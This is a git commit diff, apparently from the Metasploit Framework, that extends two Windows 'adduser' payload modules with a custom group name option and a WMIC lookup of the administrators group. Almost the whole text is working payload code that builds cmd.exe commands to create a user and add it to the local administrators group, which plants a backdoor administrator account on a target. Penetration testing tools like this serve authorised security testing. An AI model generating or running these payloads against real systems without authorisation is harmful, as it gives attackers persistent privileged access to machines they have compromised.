e631f16e0cfef6350039dd2f0f0e442a6272f207
Chris John Riley <chris.riley@c22.cc>
2012-03-18 18:12:07 +0100

    Custom group names and WMIC to automatically detect group name based on UUID

--- modules/payloads/singles/cmd/windows/adduser.rb
+++ modules/payloads/singles/cmd/windows/adduser.rb
@@ -13,48 +13,72 @@ require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
-	include Msf::Payload::Single
-	include Msf::Sessions::CommandShellOptions
+    include Msf::Payload::Single
+    include Msf::Sessions::CommandShellOptions
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'        => 'Windows Execute net user /ADD CMD',
-			'Version'     => '$Revision$',
-			'Description' => 'Create a new user and add them to local administration group',
-			'Author'      => ['hdm','scriptjunkie'],
-			'License'     => MSF_LICENSE,
-			'Platform'    => 'win',
-			'Arch'        => ARCH_CMD,
-			'Handler'     => Msf::Handler::None,
-			'Session'     => Msf::Sessions::CommandShell,
-			'PayloadType' => 'cmd',
-			'Payload'     =>
-				{
-					'Offsets' => { },
-					'Payload' => ''
-				}
-			))
+    def initialize(info = {})
+        super(merge_info(info,
+            'Name'        => 'Windows Execute net user /ADD CMD',
+            'Version'     => '$Revision$',
+            'Description' => 'Create a new user and add them to local administration group',
+            'Author'      => ['hdm','scriptjunkie','Chris John Riley'],
+            'License'     => MSF_LICENSE,
+            'Platform'    => 'win',
+            'Arch'        => ARCH_CMD,
+            'Handler'     => Msf::Handler::None,
+            'Session'     => Msf::Sessions::CommandShell,
+            'PayloadType' => 'cmd',
+            'Payload'     =>
+                {
+                    'Offsets' => { },
+                    'Payload' => ''
+                }
+            ))
 
-		register_options(
-			[
-				OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
-				OptString.new('PASS', [ true, "The password for this user", "metasploit" ]),
-			], self.class)
-	end
+        register_options(
+            [
+                OptString.new('USER',   [ true, "The username to create",     "metasploit" ]),
+                OptString.new('PASS',   [ true, "The password for this user", "metasploit" ]),
+                OptString.new('CUSTOM', [ false, "Custom group name to be used instead of default", '' ]),
+                OptBool.new('WMIC',     [ true, "Use WMIC on the target system to find the name of the local administrators group", false ]),
+            ], self.class)
+    end
 
-	def generate
-		return super + command_string
-	end
+    def generate
+        return super + command_string
+    end
 
-	def command_string
-		user = datastore['USER'] || 'metasploit'
-		pass = datastore['PASS'] || ''
+    def command_string
+        user = datastore['USER'] || 'metasploit'
+        pass = datastore['PASS'] || ''
+        cust = datastore['CUSTOM'] || ''
+        wmic = datastore['WMIC']
 
-		if(pass.length > 14)
-			raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
-		end
+        if(pass.length > 14)
+            raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
+        end
 
-		return "cmd.exe /c net user #{user} #{pass} /ADD && " +
-			"net localgroup Administrators #{user} /ADD"
-	end
+        #
+        # Check if the PASS parameter meets commonly used complexity requirements and inform the user (no blocking implemented)
+        #
+        if(pass =~ /\A^.*((?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])).*$/)
+            print_status("Password passes complexity requirements")
+        else
+            print_error("Password failed complexity requirements, this command may fail on systems that require complex passwords")
+        end
+
+        if not cust.empty?
+            print_status("Using custom group name #{cust}")
+            return "cmd.exe /c net user #{user} #{pass} /ADD && " +
+                "net localgroup \"#{cust}\" #{user} /ADD"
+        elsif wmic
+            print_status("Using WMIC to discover the administrative group name")
+            return "cmd.exe /c \"FOR /F \"usebackq skip=1\" %g IN (`wmic group where sid^='S-1-5-32-544' get name`)\"; do " +
+                "net user #{user} #{pass} /ADD && "+
+                "net localgroup %g #{user} /ADD"
+        else
+            return "cmd.exe /c net user #{user} #{pass} /ADD && " +
+                "net localgroup Administrators #{user} /ADD"
+        end
+    end
 end
--- modules/payloads/singles/windows/adduser.rb
+++ modules/payloads/singles/windows/adduser.rb
@@ -21,43 +21,67 @@ require 'msf/core/payload/windows/exec'
 ###
 module Metasploit3
 
-	include Msf::Payload::Windows::Exec
+    include Msf::Payload::Windows::Exec
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'          => 'Windows Execute net user /ADD',
-			'Version'       => '$Revision$',
-			'Description'   => 'Create a new user and add them to local administration group',
-			'Author'        => 'hdm',
-			'License'       => MSF_LICENSE,
-			'Platform'      => 'win',
-			'Arch'          => ARCH_X86,
-			'Privileged'    => true))
+    def initialize(info = {})
+        super(update_info(info,
+            'Name'          => 'Windows Execute net user /ADD',
+            'Version'       => '$Revision$',
+            'Description'   => 'Create a new user and add them to local administration group',
+            'Author'        => ['hdm','Chris John Riley'],
+            'License'       => MSF_LICENSE,
+            'Platform'      => 'win',
+            'Arch'          => ARCH_X86,
+            'Privileged'    => true))
 
-		# Register command execution options
-		register_options(
-			[
-				OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
-				OptString.new('PASS', [ true, "The password for this user", "metasploit" ]),
-			], self.class)
+        # Register command execution options
+        register_options(
+            [
+                OptString.new('USER',   [ true, "The username to create",     "metasploit" ]),
+                OptString.new('PASS',   [ true, "The password for this user", "metasploit" ]),
+                OptString.new('CUSTOM', [ false, "Custom group name to be used instead of default", '' ]),
+                OptBool.new('WMIC',     [ true, "Use WMIC on the target system to find the name of the local administrators group", false ]),
+            ], self.class)
 
-		# Hide the CMD option...this is kinda ugly
-		deregister_options('CMD')
-	end
+        # Hide the CMD option...this is kinda ugly
+        deregister_options('CMD')
+    end
 
-	#
-	# Override the exec command string
-	#
-	def command_string
-		user = datastore['USER'] || 'metasploit'
-		pass = datastore['PASS'] || ''
+    #
+    # Override the exec command string
+    #
+    def command_string
+        user = datastore['USER'] || 'metasploit'
+        pass = datastore['PASS'] || ''
+        cust = datastore['CUSTOM'] || ''
+        wmic = datastore['WMIC']
 
-		if(pass.length > 14)
-			raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
-		end
+        if(pass.length > 14)
+            raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
+        end
 
-		return "cmd.exe /c net user #{user} #{pass} /ADD && " +
-			"net localgroup Administrators #{user} /ADD"
-	end
+        #
+        # Check if the PASS parameter meets commonly used complexity requirements and inform the user (no blocking implemented)
+        #
+        if(pass =~ /\A^.*((?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])).*$/)
+            print_status("Password passes complexity requirements")
+        else
+            print_error("Password failed complexity requirements, this command may fail on systems that require complex passwords")
+        end
+
+        if not cust.empty?
+            print_status("Using custom group name #{cust}")
+            return "cmd.exe /c net user #{user} #{pass} /ADD && " +
+                "net localgroup \"#{cust}\" #{user} /ADD"
+        elsif wmic
+            print_status("Using WMIC to discover the administrative group name")
+            return "cmd.exe /c \"FOR /F \"usebackq skip=1\" %g IN (`wmic group where sid^='S-1-5-32-544' get name`)\"; do " +
+                "net user #{user} #{pass} /ADD && "+
+                "net localgroup %g #{user} /ADD"
+        else
+            return "cmd.exe /c net user #{user} #{pass} /ADD && " +
+                "net localgroup Administrators #{user} /ADD"
+        end
+    end
 
 end
